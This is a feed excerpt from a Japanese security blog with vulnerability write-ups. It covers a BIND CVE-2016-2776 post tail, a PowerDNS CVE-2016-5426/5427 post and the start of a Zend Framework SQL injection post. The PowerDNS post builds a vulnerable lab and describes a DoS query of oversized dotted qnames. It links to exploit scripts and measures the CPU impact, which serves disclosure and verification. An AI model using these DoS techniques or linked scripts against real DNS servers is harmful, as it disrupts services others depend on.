&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) info thread
  Id   Target Id         Frame
  4    Thread 0x7ffff4b35700 (LWP 27530) &quot;named&quot; 0x00007ffff6457c03 in epoll_wait () at ../sysdeps/unix/syscall-template.S:81
  3    Thread 0x7ffff5336700 (LWP 27529) &quot;named&quot; pthread_cond_wait@@GLIBC_2.3.2 () at ../nptl/sysdeps/unix/sysv/linux/x86_64/pthread_cond_wait.S:185
  2    Thread 0x7ffff5b37700 (LWP 27528) &quot;named&quot; pthread_cond_wait@@GLIBC_2.3.2 () at ../nptl/sysdeps/unix/sysv/linux/x86_64/pthread_cond_wait.S:185
* 1    Thread 0x7ffff7feb700 (LWP 27523) &quot;named&quot; ns_builtin_init () at builtin.c:559
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/10/24/CVE-2016-2776.gif&quot; alt=&quot;CVE-2016-2776&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-8&quot;&gt;追跡が必要な情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-2776&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-2776&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-2776&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-2776&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-2776&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-2776&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-2776&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-2776.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-2776&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-2776&quot;&gt;bugzilla&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-2776&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-2776&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-2776&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-2776&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-9&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;https://jprs.jp/tech/security/2016-09-28-bind9-vuln-rendering.html&lt;/li&gt;
  &lt;li&gt;https://kb.isc.org/article/AA-01419&lt;/li&gt;
  &lt;li&gt;https://github.com/rapid7/metasploit-framework/pull/7382&lt;/li&gt;
  &lt;li&gt;http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html&lt;/li&gt;
  &lt;li&gt;https://github.com/infobyte/CVE-2016-2776/blob/master/namedown.py&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 29 Sep 2016 15:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/09/29/CVE-2016-2776/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/09/29/CVE-2016-2776/</guid>
        
        
        <category>vlunerability</category>
        
      </item>
    
      <item>
        <title>CVE-2016-5426、CVE-2016-5427 - PowerDNSにバックエンドのDOS(CPU資源の消費)を実行可能な脆弱性</title>
        <description>&lt;h1 id=&quot;cve-2016-5426cve-2016-5427&quot;&gt;CVE-2016-5426、CVE-2016-5427&lt;/h1&gt;

&lt;p&gt;PowerDNSのAuthoritative ServerにはDOS(CPU資源の消費)が実行可能な脆弱性が存在します。&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;h2 id=&quot;cve-2016-5426cvss-v3&quot;&gt;CVE-2016-5426のCVSS v3&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;CVSS v3 Base Score&lt;/td&gt;
      &lt;td&gt;7.5 High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Vector&lt;/td&gt;
      &lt;td&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact Score&lt;/td&gt;
      &lt;td&gt;3.6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Exploitability Score&lt;/td&gt;
      &lt;td&gt;3.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Vector (AV)&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Complexity (AC)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Privileges Required (PR)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User Interaction (UI)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scope (S)&lt;/td&gt;
      &lt;td&gt;Unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Confidentiality (C)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Integrity (I)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Availability (A)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;cve-2016-5427cvss-v3&quot;&gt;CVE-2016-5427のCVSS v3&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;CVSS v3 Base Score&lt;/td&gt;
      &lt;td&gt;7.5 High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Vector&lt;/td&gt;
      &lt;td&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact Score&lt;/td&gt;
      &lt;td&gt;3.6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Exploitability Score&lt;/td&gt;
      &lt;td&gt;3.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Vector (AV)&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Complexity (AC)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Privileges Required (PR)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User Interaction (UI)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scope (S)&lt;/td&gt;
      &lt;td&gt;Unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Confidentiality (C)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Integrity (I)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Availability (A)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;p&gt;PowerDNS Authoritative Server 3.4.10以上へのアップグレード&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;p&gt;PowerDNS Authoritative Server 3.4.10 未満&lt;/p&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;h3 id=&quot;section-4&quot;&gt;脆弱な環境の構築&lt;/h3&gt;

&lt;p&gt;PowerDNS Authoritative Server 3.4.9の環境を構築する。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;pdns version 3.4.9をソースからインストールする&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install g++ libboost-all-dev libtool make pkg-config libmysqlclient-dev libssl-dev autoconf bison
$ wget https://downloads.powerdns.com/releases/pdns-3.4.9.tar.bz2
$ tar xjvf pdns-3.4.9.tar.bz2
$ cd pdns-3.4.9
$ ./bootstrap
$ ./configure --with-modules=&quot;gmysql&quot;
$ make
$ sudo make install
$ sudo cp pdns/pdns /etc/init.d/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLにPowerDNS用のテーブルを作成する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; CREATE DATABASE powerdns CHARACTER SET utf8;
Query OK, 1 row affected (0.04 sec)

mysql&amp;gt; CREATE USER 'powerdns'@'localhost' IDENTIFIED BY 'powerdns';
Query OK, 0 rows affected (0.14 sec)

mysql&amp;gt; GRANT ALL PRIVILEGES ON powerdns.* TO 'powerdns'@'localhost';
Query OK, 0 rows affected (0.02 sec)

mysql&amp;gt; use powerdns;
Database changed
mysql&amp;gt; CREATE TABLE domains (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   name                  VARCHAR(255) NOT NULL,
    -&amp;gt;   master                VARCHAR(128) DEFAULT NULL,
    -&amp;gt;   last_check            INT DEFAULT NULL,
    -&amp;gt;   type                  VARCHAR(6) NOT NULL,
    -&amp;gt;   notified_serial       INT DEFAULT NULL,
    -&amp;gt;   account               VARCHAR(40) DEFAULT NULL,
    -&amp;gt;   PRIMARY KEY (id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected (0.18 sec)

mysql&amp;gt; CREATE UNIQUE INDEX name_index ON domains(name);
Query OK, 0 rows affected (0.07 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE TABLE records (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   domain_id             INT DEFAULT NULL,
    -&amp;gt;   name                  VARCHAR(255) DEFAULT NULL,
    -&amp;gt;   type                  VARCHAR(10) DEFAULT NULL,
    -&amp;gt;   content               VARCHAR(64000) DEFAULT NULL,
    -&amp;gt;   ttl                   INT DEFAULT NULL,
    -&amp;gt;   prio                  INT DEFAULT NULL,
    -&amp;gt;   change_date           INT DEFAULT NULL,
    -&amp;gt;   disabled              TINYINT(1) DEFAULT 0,
    -&amp;gt;   ordername             VARCHAR(255) BINARY DEFAULT NULL,
    -&amp;gt;   auth                  TINYINT(1) DEFAULT 1,
    -&amp;gt;   PRIMARY KEY (id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected, 1 warning (0.08 sec)

mysql&amp;gt; CREATE INDEX nametype_index ON records(name,type);
Query OK, 0 rows affected (0.05 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE INDEX domain_id ON records(domain_id);
Query OK, 0 rows affected (0.05 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE INDEX recordorder ON records (domain_id, ordername);
Query OK, 0 rows affected (0.09 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE TABLE supermasters (
    -&amp;gt;   ip                    VARCHAR(64) NOT NULL,
    -&amp;gt;   nameserver            VARCHAR(255) NOT NULL,
    -&amp;gt;   account               VARCHAR(40) NOT NULL,
    -&amp;gt;   PRIMARY KEY (ip, nameserver)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected (0.05 sec)

mysql&amp;gt; CREATE TABLE comments (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   domain_id             INT NOT NULL,
    -&amp;gt;   name                  VARCHAR(255) NOT NULL,
    -&amp;gt;   type                  VARCHAR(10) NOT NULL,
    -&amp;gt;   modified_at           INT NOT NULL,
    -&amp;gt;   account               VARCHAR(40) NOT NULL,
    -&amp;gt;   comment               VARCHAR(64000) NOT NULL,
    -&amp;gt;   PRIMARY KEY (id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql&amp;gt; CREATE INDEX comments_domain_id_idx ON comments (domain_id);
Query OK, 0 rows affected (0.15 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE INDEX comments_name_type_idx ON comments (name, type);
Query OK, 0 rows affected (0.18 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE INDEX comments_order_idx ON comments (domain_id, modified_at);
Query OK, 0 rows affected (0.05 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE TABLE domainmetadata (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   domain_id             INT NOT NULL,
    -&amp;gt;   kind                  VARCHAR(32),
    -&amp;gt;   content               TEXT,
    -&amp;gt;   PRIMARY KEY (id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; CREATE INDEX domainmetadata_idx ON domainmetadata (domain_id, kind);
Query OK, 0 rows affected (0.05 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE TABLE cryptokeys (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   domain_id             INT NOT NULL,
    -&amp;gt;   flags                 INT NOT NULL,
    -&amp;gt;   active                BOOL,
    -&amp;gt;   content               TEXT,
    -&amp;gt;   PRIMARY KEY(id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected (0.03 sec)

mysql&amp;gt; CREATE INDEX domainidindex ON cryptokeys(domain_id);
Query OK, 0 rows affected (0.04 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; CREATE TABLE tsigkeys (
    -&amp;gt;   id                    INT AUTO_INCREMENT,
    -&amp;gt;   name                  VARCHAR(255),
    -&amp;gt;   algorithm             VARCHAR(50),
    -&amp;gt;   secret                VARCHAR(255),
    -&amp;gt;   PRIMARY KEY (id)
    -&amp;gt; ) Engine=InnoDB;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; CREATE UNIQUE INDEX namealgoindex ON tsigkeys(name, algorithm);
Query OK, 0 rows affected (0.08 sec)
Records: 0  Duplicates: 0  Warnings: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pdns.confを作成する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat /usr/local/etc/pdns.conf
launch=gmysql
loglevel=10
log-dns-queries=1
gmysql-host=127.0.0.1
gmysql-user=powerdns
gmysql-password=powerdns
gmysql-dbname=powerdns
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;*　レコードを追加する&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mysql -upowerdns -ppowerdns
mysql&amp;gt; use poserdns;
INSERT INTO domains (name, type) values ('scapegoat.net', 'NATIVE');
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'scapegoat.net','localhost ahu@ds9a.nl 1','SOA',86400,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'scapegoat.net','dns-us1.powerdns.net','NS',86400,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'scapegoat.net','dns-eu1.powerdns.net','NS',86400,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'www.scapegoat.net','192.1.1.10','A',120,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'mail.scapegoat.net','192.1.1.11','A',120,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'pop.scapegoat.net','192.1.1.12','A',120,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'imap.scapegoat.net','192.1.1.13','A',120,NULL);
INSERT INTO records (domain_id, name, content, type,ttl,prio) VALUES (1,'admin.scapegoat.net','192.1.1.14','A',120,NULL);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;レコードが引けることを確認する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:~# dig www.scapegoat.net @127.0.0.1 +short
192.1.1.10
root@scapegoat:~# dig mail.scapegoat.net @127.0.0.1 +short
192.1.1.11
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;systat&quot;&gt;負荷を計測するためにsystatを入れる&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# apt-get -y install sysstat
# dpkg-reconfigure sysstat
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;dnsdos&quot;&gt;正常なDNSクエリでDOSをしてみる&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/KosukeShimofuji/CVE-2016-5426_and_CVE-2016-5427/blob/master/exploit/powerdns_correct_query_dos.py&quot;&gt;powerdns_correct_query_dos.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/28/correct_query.gif&quot; alt=&quot;correct_query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;正常に引けるクエリを500qps程度送り込むとidleは90%程度になる。&lt;/p&gt;

&lt;h3 id=&quot;byteqnamedos&quot;&gt;500byteを超える.を多数含んだqnameでDOSをしてみる&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/KosukeShimofuji/CVE-2016-5426_and_CVE-2016-5427/blob/master/exploit/powerdns_attack_query_dos.py&quot;&gt;powerdns_attack_query_dos.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/28/attack_query.gif&quot; alt=&quot;attack_query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;今回問題になっているクエリを500qps程度送り込むとidleは40-30%程度になる。&lt;/p&gt;

&lt;h3 id=&quot;pdns-3410&quot;&gt;pdns-3.4.10にアップグレードして検証する&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# /usr/local/sbin/pdns_server --version
Sep 28 16:57:23 PowerDNS Authoritative Server 3.4.10 (jenkins@autotest.powerdns.com) (C) 2001-2016 PowerDNS.COM BV
Sep 28 16:57:23 Using 64-bits mode. Built on 20160928165600 by root@scapegoat.test, gcc 4.9.2.
Sep 28 16:57:23 PowerDNS comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it according to the terms of the GPL version 2.
Sep 28 16:57:23 Features: openssl libdl
Sep 28 16:57:23 Built-in modules: gmysql
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/28/upgrade.gif&quot; alt=&quot;upgrade&quot; /&gt;&lt;/p&gt;

&lt;p&gt;idleは95%以上低下することはなくなっている。&lt;/p&gt;

&lt;h2 id=&quot;cve-2016-5426&quot;&gt;CVE-2016-5426に関する追跡が必要な情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-5426&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-5426&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-5426&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-5426&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5426&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-5426&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-5426&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5426.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5426&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-5426&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5426&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-5426&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5426&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-5426&quot;&gt;bugzilla&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2016-5427&quot;&gt;CVE-2016-5427に関する追跡が必要な情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-5427&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-5427&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-5427&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-5427&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5427&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-5427&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-5427&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5427.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5427&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-5427&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5427&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-5427&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5427&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-5427&quot;&gt;bugzilla&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-5&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-004855.html&lt;/li&gt;
  &lt;li&gt;http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-004856.html&lt;/li&gt;
  &lt;li&gt;http://qiita.com/sischkg/items/f02783e741988663c90a&lt;/li&gt;
  &lt;li&gt;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-5426&lt;/li&gt;
  &lt;li&gt;https://github.com/PowerDNS/pdns/commit/881b5b03a590198d03008e4200dd00cc537712f3&lt;/li&gt;
  &lt;li&gt;https://github.com/PowerDNS/pdns&lt;/li&gt;
  &lt;li&gt;http://takuya-1st.hatenablog.jp/entry/2016/07/14/202554&lt;/li&gt;
  &lt;li&gt;https://doc.powerdns.com/md/security/powerdns-advisory-2016-01/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Wed, 28 Sep 2016 10:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/09/28/CVE-2016-5426/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/09/28/CVE-2016-5426/</guid>
        
        
        <category>vlunerability</category>
        
      </item>
    
      <item>
        <title>CVE-2016-4861 - Zend Framework における SQL インジェクションの脆弱性</title>
        <description>&lt;h1 id=&quot;section&quot;&gt;概要&lt;/h1&gt;

&lt;p&gt;HASHコンサルティング株式会社 徳丸 浩 さんにより、ZendFramework 1に&lt;a href=&quot;https://framework.zend.com/manual/1.12/ja/zend.db.select.html&quot;&gt;Zend_Db_Select&lt;/a&gt;のOrder by句およびGroup By句の引数の処理に起因するSQLインジェクションの脆弱性が発見されました。&lt;/p&gt;

&lt;h1 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h1&gt;

&lt;p&gt;2016年09月16日時点でNVDは非公開&lt;/p&gt;

&lt;h1 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Zend Framework 1.12.20へのアップグレードしてください。&lt;/li&gt;
  &lt;li&gt;修正コミット情報
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/zendframework/zf1/commit/b1c71dd94296d9000127720c85a7ea9e3b35af4b&quot;&gt;b1c71dd94296d9000127720c85a7ea9e3b35af4b&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/zendframework/zf1/commit/bf3f40605be3d8f136a07ae991079a7dcb34d967&quot;&gt;bf3f40605be3d8f136a07ae991079a7dcb34d967&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Zend Framework 1.12.20以前のversion&lt;/li&gt;
&lt;/ul&gt;

